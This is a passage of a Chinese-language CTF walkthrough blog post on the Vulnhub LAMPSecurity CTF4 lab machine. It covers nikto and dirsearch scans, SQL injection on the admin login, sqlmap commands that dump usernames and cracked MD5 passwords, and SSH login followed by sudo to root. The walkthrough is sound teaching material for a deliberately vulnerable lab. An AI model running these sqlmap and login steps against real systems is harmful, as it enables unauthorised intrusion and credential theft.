/?=PHPE9568F35-D428-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003ed2-A769-\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003eAA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-\u003cspan class=\"hljs-number\"\u003e12184\u003c/span\u003e\n+ /admin/: This might be interesting.\n+ /pages/: \u003cspan class=\"hljs-built_in\"\u003eDirectory\u003c/span\u003e indexing found.\n+ /pages/: This might be interesting.\n+ /admin/index.php: This might be interesting: has been seen in web logs \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e an unknown scanner.\n+ /mail/src/read_body.php: Cookie SQMSESSID created without the httponly flag. See: https:\u003cspan class=\"hljs-comment\"\u003e//developer.mozilla.org/en-US/docs/Web/HTTP/Cookies\u003c/span\u003e\n+ /mail/src/read_body.php: SquirrelMail found.\n+ /icons/: \u003cspan class=\"hljs-built_in\"\u003eDirectory\u003c/span\u003e indexing found.\n+ /images/: \u003cspan class=\"hljs-built_in\"\u003eDirectory\u003c/span\u003e indexing found.\n+ /admin/admin.php?adminpy=\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e: PY-Membres \u003cspan class=\"hljs-number\"\u003e4.2\u003c/span\u003e may allow administrator access. See: http:\u003cspan class=\"hljs-comment\"\u003e//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1198\u003c/span\u003e\n+ /icons/README: Apache \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e file found. See: https:\u003cspan class=\"hljs-comment\"\u003e//www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/\u003c/span\u003e\n+ /admin/login.php: Admin login page/section found.\n+ /\u003cspan class=\"hljs-comment\"\u003e#wp-config.php#: #wp-config.php# file found. This file contains the credentials.\u003c/span\u003e\n+ \u003cspan class=\"hljs-number\"\u003e9078\u003c/span\u003e requests: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e \u003cspan class=\"hljs-title function_ invoke__\"\u003eerror\u003c/span\u003e(s) \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e \u003cspan class=\"hljs-title function_ invoke__\"\u003eitem\u003c/span\u003e(s) reported on remote host\n+ End Time:           \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e09\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e (GMT8) (\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e seconds)\n---------------------------------------------------------------------------\n+ \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e \u003cspan class=\"hljs-title function_ invoke__\"\u003ehost\u003c/span\u003e(s) tested\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e存在\u003ccode\u003e/robots.txt\u003c/code\u003e ，还发现了几个可能会有兴趣的目录\u003c/p\u003e\n\u003cp\u003e优先级依然是\u003ccode\u003e80\u003c/code\u003e最大\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eweb渗透\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e爆破目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003edirsearch -u \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.138\u003c/span\u003e       \n\u003cspan class=\"hljs-comment\"\u003e//              \u003c/span\u003e\n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e315\u003c/span\u003eB  - /admin  -\u003e  http:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.138/admin/          \u003c/span\u003e\n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003eKB - /admin/                                           \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   \u003cspan class=\"hljs-number\"\u003e51\u003c/span\u003eB  - /admin/admin.php                                  \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003eKB - /admin/index.php                                  \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e769\u003c/span\u003eB  - /admin/login.php                                  \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e318\u003c/span\u003eB  - /calendar  -\u003e  http:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.138/calendar/    \u003c/span\u003e\n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e289\u003c/span\u003eB  - /cgi-bin/                                         \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e617\u003c/span\u003eB  - /conf                                             \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e617\u003c/span\u003eB  - /conf/                                            \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e617\u003c/span\u003eB  - /conf/catalina.properties\n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e617\u003c/span\u003eB  - /conf/catalina.policy\n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e617\u003c/span\u003eB  - /conf/context.xml\n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e617\u003c/span\u003eB  - /conf/logging.properties\n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e617\u003c/span\u003eB  - /conf/tomcat-users.xml\n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e617\u003c/span\u003eB  - /conf/web.xml\n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e617\u003c/span\u003eB  - /conf/Catalina                                    \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e617\u003c/span\u003eB  - /conf/server.xml                                  \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e617\u003c/span\u003eB  - /conf/tomcat8.conf\n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e35\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e287\u003c/span\u003eB  - /error/                                           \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e316\u003c/span\u003eB  - /images  -\u003e  http:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.138/images/        \u003c/span\u003e\n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e905\u003c/span\u003eB  - /images/\n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e313\u003c/span\u003eB  - /inc  -\u003e  http:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.138/inc/              \u003c/span\u003e\n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003eKB - /inc/                                             \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e314\u003c/span\u003eB  - /mail  -\u003e  http:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.138/mail/            \u003c/span\u003e\n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e -    \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eB  - /mail/  -\u003e  src/login.php                         \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e315\u003c/span\u003eB  - /pages  -\u003e  http:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.138/pages/          \u003c/span\u003e\n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003eKB - /pages/                                           \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e401\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e480\u003c/span\u003eB  - /restricted                                       \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e104\u003c/span\u003eB  - /robots.txt                                       \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e01\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e313\u003c/span\u003eB  - /sql  -\u003e  http:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.138/sql/              \u003c/span\u003e\n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e02\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e868\u003c/span\u003eB  - /sql/                                             \n[\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e315\u003c/span\u003eB  - /usage  -\u003e  http:\u003cspan class=\"hljs-comment\"\u003e//192.168.75.138/usage/                                              \u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e访问感兴趣的目录\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003erobots.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003eUser-agent: *\nDisallow: /mail/\nDisallow: /restricted/\nDisallow: /conf/\nDisallow: /sql/\nDisallow: /admin/\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扫描出来的目录，无意义了\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ehttp://192.168.75.138/mail/src/login.php\u003c/code\u003e  SquirreMail 的登陆页面\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e/sql/db.sql\u003c/code\u003e 存在一个敏感文件，是创建表的数据，对sql注入可能有帮助\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e\u003cspan class=\"hljs-keyword\"\u003euse\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eehks\u003c/span\u003e;\ncreate table \u003cspan class=\"hljs-title function_ invoke__\"\u003euser\u003c/span\u003e (user_id \u003cspan class=\"hljs-keyword\"\u003eint\u003c/span\u003e not \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e auto_increment primary key, user_name \u003cspan class=\"hljs-title function_ invoke__\"\u003evarchar\u003c/span\u003e(\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e) not \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e, user_pass \u003cspan class=\"hljs-title function_ invoke__\"\u003evarchar\u003c/span\u003e(\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e) not \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e);\ncreate table \u003cspan class=\"hljs-title function_ invoke__\"\u003eblog\u003c/span\u003e (blog_id \u003cspan class=\"hljs-keyword\"\u003eint\u003c/span\u003e primary key not \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e auto_increment, blog_title \u003cspan class=\"hljs-title function_ invoke__\"\u003evarchar\u003c/span\u003e(\u003cspan class=\"hljs-number\"\u003e255\u003c/span\u003e), blog_body text, blog_date datetime not \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e);\ncreate table \u003cspan class=\"hljs-title function_ invoke__\"\u003ecomment\u003c/span\u003e (comment_id \u003cspan class=\"hljs-keyword\"\u003eint\u003c/span\u003e not \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e auto_increment primary key, comment_title \u003cspan class=\"hljs-title function_ invoke__\"\u003evarchar\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e), comment_body text, comment_author \u003cspan class=\"hljs-title function_ invoke__\"\u003evarchar\u003c/span\u003e(\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e), comment_url \u003cspan class=\"hljs-title function_ invoke__\"\u003evarchar\u003c/span\u003e(\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e), comment_date datetime not \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e/restricted\u003c/code\u003e 进入了提示让你输入入账号密码\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e/admin\u003c/code\u003e 一个登陆界面，上面的\u003ccode\u003esql\u003c/code\u003e文件应该是对应这个网站的\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试\u003ccode\u003esql\u003c/code\u003e注入\u003ccode\u003e/admin\u003c/code\u003e ，因为\u003ccode\u003edb.sql\u003c/code\u003e 把表结构爆出来了\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eburp\u003c/code\u003e抓包来尝试\u003ccode\u003esql\u003c/code\u003e注入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003eusername=admin\u003cspan class=\"hljs-string\"\u003e'\u0026#x26;password=1\n// \nProblem with query:\nselect user_id from user where user_name='\u003c/span\u003eadmin\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e AND user_pass = \u003cspan class=\"hljs-title function_ invoke__\"\u003emd5\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'1'\u003c/span\u003e)\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the right syntax to \u003cspan class=\"hljs-keyword\"\u003euse\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003enear\u003c/span\u003e '1')' \u003cspan class=\"hljs-title\"\u003eat\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eline\u003c/span\u003e 2\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e直接把\u003ccode\u003esql\u003c/code\u003e语句爆出来了，继续注入，可以使用\u003ccode\u003esqlmap\u003c/code\u003e ，将抓出来的包内容复制出来保存为\u003ccode\u003epost\u003c/code\u003e，然后使用\u003ccode\u003esqlmap\u003c/code\u003e注入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e\u003cspan class=\"hljs-comment\"\u003e//POST 内容\u003c/span\u003e\nPOST /admin/index.php HTTP/\u003cspan class=\"hljs-number\"\u003e1.1\u003c/span\u003e\nHost: \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.138\u003c/span\u003e\nUser-Agent: Mozilla/\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e (Windows NT \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e; Win64; x64; rv:\u003cspan class=\"hljs-number\"\u003e130.0\u003c/span\u003e) Gecko/\u003cspan class=\"hljs-number\"\u003e20100101\u003c/span\u003e Firefox/\u003cspan class=\"hljs-number\"\u003e130.0\u003c/span\u003e\nAccept: text/html,application/xhtml+xml,application/xml;q=\u003cspan class=\"hljs-number\"\u003e0.9\u003c/span\u003e,image/avif,image/webp,image/png,image/svg+xml,*\u003cspan class=\"hljs-comment\"\u003e/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 34\nOrigin: http://192.168.75.138\nSec-GPC: 1\nConnection: keep-alive\nReferer: http://192.168.75.138/admin/\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\n\nusername=*\u0026#x26;password=1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e直接  \u003ccode\u003esqlmap -r post -dbs\u003c/code\u003e 爆出数据库名是\u003ccode\u003eehks\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e因为\u003ccode\u003eindex\u003c/code\u003e页面写着**\u003ccode\u003eProfessor Ehks Center for Data Studies\u003c/code\u003e** ，所以我们把他数据\u003ccode\u003edump\u003c/code\u003e出来\u003c/p\u003e\n\u003cp\u003e爆出用户数据，密码没爆出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003esqlmap -r post -D ehks -T user --dump\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\nuser_id\tuser_name\tuser_pass\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\t      dstevens\t\n\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\t      achen\t\n\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e\t      pmoore\t\n\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\t      jdurbin\t\n\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e\t      sorzek\t\n\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e\t      ghighland\t\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e单独\u003ccode\u003edump\u003c/code\u003e 密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e sqlmap -r post -D ehks -T user -C user_pass --dump\n\u003cspan class=\"hljs-comment\"\u003e//\u003c/span\u003e\n+--------------------------------------------------+\n| user_pass                                        |\n+--------------------------------------------------+\n| \u003cspan class=\"hljs-number\"\u003e02e823\u003c/span\u003ea15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |\n| \u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003ed1f88b9b276aece4b0edcc25b7a434 (pacman)        |\n| \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003ec7bc9f465d86b8164686ebb5151a717 (Sue1978)       |\n| \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003ef4743c04ed8e5f39166a81f26319bb5 (Homesite)      |\n| \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003ef3eb3087298ff21843cc4e013cf355f (undone1)       |\n| \u003cspan class=\"hljs-title function_ invoke__\"\u003eb46265f1e7faa3beab09db5c28739380\u003c/span\u003e (seventysixers) |\n+--------------------------------------------------+\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eBlog\u003c/code\u003e后台和\u003ccode\u003email\u003c/code\u003e后台都可以登陆进去，寻找可利用点，甚至ssh\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eBlog\u003c/code\u003e找不到可利用点\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003email\u003c/code\u003e 后台是\u003ccode\u003eSquirreMail1.4.17\u003c/code\u003e ，存在远程代码执行漏洞，不过很麻烦先试试\u003ccode\u003essh\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003essh\u003c/code\u003e登陆显示，版本太旧的原因\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003essh pmoore@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.138\u003c/span\u003e\nUnable to negotiate with \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.138\u003c/span\u003e port \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e指令修改为即可尝试登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003essh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss -oCiphers=+\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003edes-cbc pmoore@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e75.138\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后使用 \u003ccode\u003edstevens\u003c/code\u003e 和\u003ccode\u003eilike2surf\u003c/code\u003e 成功登录获得\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看当前shell权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e[dstevens@ctf4 ~]$ whoami\ndstevens\n[dstevens@ctf4 ~]$ dpkg -l\n-bash: dpkg: command not found\n[dstevens@ctf4 ~]$ sudo -l\nPassword:\nUser dstevens may run the following commands on this host:\n    (ALL) ALL\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e权限是超级高的，相当于root权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e[dstevens@ctf4 ~]$ sudo -i\n[root@ctf4 ~]\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得root权限了\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e","title":"Vulnhub - LAMPSecurity CTF4","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机"}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"VulnhubLAMPSecurity CTF4"},"buildId":"lg8P0Lo-zDl0pbzeQCZZz","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>